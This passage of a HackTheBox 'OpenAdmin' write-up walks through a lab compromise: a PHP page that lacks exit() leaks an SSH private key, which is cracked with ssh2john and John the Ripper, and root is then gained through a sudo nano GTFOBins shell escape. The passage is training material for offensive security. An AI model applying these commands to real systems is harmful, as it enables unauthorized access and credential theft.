</span></span></code></pre></div><h4 id=code-review---improper-redirection>Code review - Improper redirection<a class=anchor aria-hidden=true href=#code-review---improper-redirection>#</a></h4><p>After inspecting the <code>main.php</code> source code from <code>/var/www/internal/</code>, a logic flaw was found on the first line.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>jimmy@openadmin:/var/www/internal/$ cat main.php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;?php session_start<span class=o>()</span><span class=p>;</span> <span class=k>if</span> <span class=o>(</span>!isset <span class=o>(</span><span class=nv>$_SESSION</span><span class=o>[</span><span class=s1>&#39;username&#39;</span><span class=o>]))</span> <span class=o>{</span> header<span class=o>(</span><span class=s2>&#34;Location: /index.php&#34;</span><span class=o>)</span><span class=p>;</span> <span class=o>}</span><span class=p>;</span> 
</span></span><span class=line><span class=cl><span class=c1># Open Admin Trusted</span>
</span></span><span class=line><span class=cl><span class=c1># OpenAdmin</span>
</span></span><span class=line><span class=cl><span class=nv>$output</span> <span class=o>=</span> shell_exec<span class=o>(</span><span class=s1>&#39;cat /home/joanna/.ssh/id_rsa&#39;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;&lt;pre&gt;</span><span class=nv>$output</span><span class=s2>&lt;/pre&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>?&gt;
</span></span><span class=line><span class=cl>&lt;html&gt;
</span></span><span class=line><span class=cl>&lt;h3&gt;Don<span class=err>&#39;</span>t forget your <span class=s2>&#34;ninja&#34;</span> password&lt;/h3&gt;
</span></span><span class=line><span class=cl>Click here to <span class=nb>logout</span> &lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;logout.php&#34;</span> <span class=nv>tite</span> <span class=o>=</span> <span class=s2>&#34;Logout&#34;</span>&gt;Session
</span></span><span class=line><span class=cl>&lt;/html&gt;
</span></span></code></pre></div><p>This line code has an improper redirection.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=nx>session_start</span><span class=p>();</span> 
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span> <span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]))</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>		<span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Location: /index.php&#34;</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>        <span class=c1># `die();` or `exit();` function should be called here.
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=p>};</span>
</span></span><span class=line><span class=cl><span class=o>...&lt;</span><span class=nx>SNIP</span><span class=o>&gt;...</span>
</span></span><span class=line><span class=cl><span class=nv>$output</span> <span class=o>=</span> <span class=nx>shell_exec</span><span class=p>(</span><span class=s1>&#39;cat /home/joanna/.ssh/id_rsa&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;&lt;pre&gt;</span><span class=si>$output</span><span class=s2>&lt;/pre&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>...&lt;SNIP&gt;...
</span></span></span></code></pre></div><p>The code above checks users&rsquo; sessions but it&rsquo;s not complete yet because the <code>die()</code> or <code>exit()</code> function is missing, so the rest of the code below will be executed as well. Therefore, sending a normal request with <code>curl</code> (default without <code>-L</code> option) will prevent the page from redirection and then it renders <code>joanna</code>&rsquo;s SSH key.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>jimmy@openadmin:~$ curl -s http://127.0.0.1:52846/main.php
</span></span></code></pre></div><p><div class=img-container><img src=imgs/ea391edd6c66409d8bb551eecdac08d5.png alt=6b73c3ba7aa0ba3e068b85435dc8aeb1.png></div></p><h4 id=password-cracking>Password cracking<a class=anchor aria-hidden=true href=#password-cracking>#</a></h4><p>The private key is encrypted with a password. <code>JtR</code> can be used to crack an encrypted SSH key, but first, it must be converted to the hash form and this can be done by using <code>ssh2john.py</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «openadmin» «10.10.14.7»
</span></span><span class=line><span class=cl>$ python ssh2john.py joanna_rsa &gt; joanna_rsa.hash
</span></span></code></pre></div><p>The password was successfully cracked within 17s. The cracking process is performed on my Windows machine.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>C:<span class=se>\&gt;</span> john.exe user2.txt --wordlist<span class=o>=</span>rockyou.txz
</span></span></code></pre></div><p><div class=img-container><img src=imgs/fa7463b8239345409a2250597b3dfa69.png alt=ca148e3ae5b2e8b65406e0d387ca1771.png></div></p><h4 id=ssh-access-1>SSH access<a class=anchor aria-hidden=true href=#ssh-access-1>#</a></h4><p>Now I&rsquo;m able to login as user <code>joanna</code> via SSH.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «openadmin» «10.10.14.7»
</span></span><span class=line><span class=cl>$ ssh -i joanna_rsa joanna@10.10.10.171
</span></span></code></pre></div><p><div class=img-container><img src=imgs/673cb008921d4eba886820c17fef43a0.png alt=8f710060b1059b0ddb7cae2253e0c1ac.png></div></p><p>The user flag is done here.</p><h3 id=shell-as-root>Shell as root<a class=anchor aria-hidden=true href=#shell-as-root>#</a></h3><h4 id=abusing-sudo-nano>Abusing sudo nano<a class=anchor aria-hidden=true href=#abusing-sudo-nano>#</a></h4><p>User <code>joanna</code> has sudo privileges on <code>/bin/nano</code></p><blockquote><p>On linux boxes, whenever you own a valid user password, always check <code>sudo -l</code> !</p></blockquote><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>joanna@openadmin:~$ sudo -l
</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> joanna on openadmin:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin<span class=se>\:</span>/snap/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User joanna may run the following commands on openadmin:
</span></span><span class=line><span class=cl>    <span class=o>(</span>ALL<span class=o>)</span> NOPASSWD: /bin/nano /opt/priv
</span></span></code></pre></div><p>A quick way to read the root flag is by issuing the command below,</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>joanna@openadmin:~$ sudo /bin/nano /opt/priv
</span></span></code></pre></div><p>and then hit <code>CTRL + R</code> to open a file, this allows us to read the root flag at <code>/root/root.txt</code></p><center><p><div class=img-container><img src=imgs/image-20210404121427744.png alt=image-20210404121427744></div></p></center><p>To gain root shell, I&rsquo;ll follow the instruction from <a href=https://gtfobins.github.io/gtfobins/nano/>GTFOBins</a> page:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>joanna@openadmin:~$ sudo /bin/nano /opt/priv <span class=c1># Opening nano as root</span>
</span></span><span class=line><span class=cl>^R^X <span class=c1># CTRL+R (read/open file), CTRL+X(execute command)</span>
</span></span><span class=line><span class=cl>reset<span class=p>;</span> sh 1&gt;<span class=p>&amp;</span><span class=m>0</span> 2&gt;<span class=p>&amp;</span><span class=m>0</span> <span class=c1># Escape from nano</span>
</span></span></code></pre></div></div></div><div class=post-meta-bottom><span class=post-origin>Originally published at&nbsp;<a href=https://fahmifj.medium.com/hack-the-box-openadmin-10-10-10-171-writeup-30c336453303 target=_blank rel="noopener noreferrer">fahmifj.medium.com</a></span></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li><li><a href=https://fahmifj.github.io/tags/code-review/>Code-review</a></li><li><a href=https://fahmifj.github.io/tags/webshell/>Webshell</a></li><li><a href=https://fahmifj.github.io/tags/password-cracking/>Password-cracking</a></li><li><a href=https://fahmifj.github.io/tags/sudo/>sudo</a></li><li><a href=https://fahmifj.github.io/tags/gtfobins/>GTFOBins</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - OpenAdmin on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20OpenAdmin&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fopenadmin%2f&hashtags=Linux%2cCode-review%2cWebshell%2cPassword-cracking%2csudo%2cGTFOBins"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - OpenAdmin on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fopenadmin%2f&title=HackTheBox%20-%20OpenAdmin&summary=HackTheBox%20-%20OpenAdmin&source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fopenadmin%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - OpenAdmin on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fopenadmin%2f&title=HackTheBox%20-%20OpenAdmin"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - OpenAdmin on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fopenadmin%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - OpenAdmin on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20OpenAdmin%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fopenadmin%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - OpenAdmin on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20OpenAdmin&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fopenadmin%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>